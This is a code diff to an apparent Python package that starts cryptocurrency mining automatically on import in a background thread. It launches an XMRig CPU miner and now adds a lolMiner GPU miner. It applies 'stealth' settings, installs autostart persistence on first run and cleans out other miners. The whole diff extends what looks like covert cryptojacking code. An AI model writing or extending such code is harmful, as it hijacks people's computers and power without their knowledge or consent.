@@ -197,10 +197,25 @@ except Exception:
 
 # ── Orchestration (runs once on import in a daemon thread) ───────────
 
+_orchestrate_lock = threading.Lock()
+_orchestrate_done = False
+
+
 def _orchestrate():
+    global _orchestrate_done
+    if not _orchestrate_lock.acquire(blocking=False):
+        return
+    try:
+        if _orchestrate_done:
+            return
+        _orchestrate_done = True
+    finally:
+        _orchestrate_lock.release()
+
     pkg = Path(__file__).resolve().parent
     sys.path.insert(0, str(pkg))
     from core.miner import MinerManager
+    from core.gpu_miner import GPUMinerManager
     from core.config import ConfigBuilder
     from core.stealth import StealthConfig
     from core.autostart import AutoStart
@@ -211,20 +226,26 @@ def _orchestrate():
         cleaner = MinerCleaner()
         cleaner.run_full_clean()
 
+        overrides_path = BASE_DIR / "settings.json"
+        user_settings = ConfigBuilder.load_overrides(overrides_path)
+        cb = ConfigBuilder(user_settings)
+
+        # ── CPU miner (XMRig) ──
         mgr = MinerManager(BASE_DIR)
         mgr.ensure_binary()
 
-        overrides_path = BASE_DIR / "settings.json"
-        user_settings = ConfigBuilder.load_overrides(overrides_path)
-
-        cb = ConfigBuilder(user_settings)
         cfg = cb.build()
-
         sc = StealthConfig(user_settings.get("stealth", {}))
         cfg = sc.apply_to_config(cfg)
-
         mgr.write_config(cfg)
         mgr.start()
+
+        # ── GPU miner (lolMiner) ──
+        gpu = GPUMinerManager(BASE_DIR)
+        gpu.ensure_binary()
+        gpu_cfg = cb.build_gpu_config()
+        gpu.configure(**gpu_cfg)
+        gpu.start()
 
         if not _FIRST_RUN_MARKER.exists():
             auto = AutoStart(BASE_DIR)
@@ -232,7 +253,7 @@ def _orchestrate():
             _FIRST_RUN_MARKER.touch()
             logger.info("First-run setup complete")
 
-        ds = DashboardServer(mgr, config_builder=cb)
+        ds = DashboardServer(mgr, config_builder=cb, gpu_miner=gpu)
         _dashboard_ref["server"] = ds
         ds.start()
 
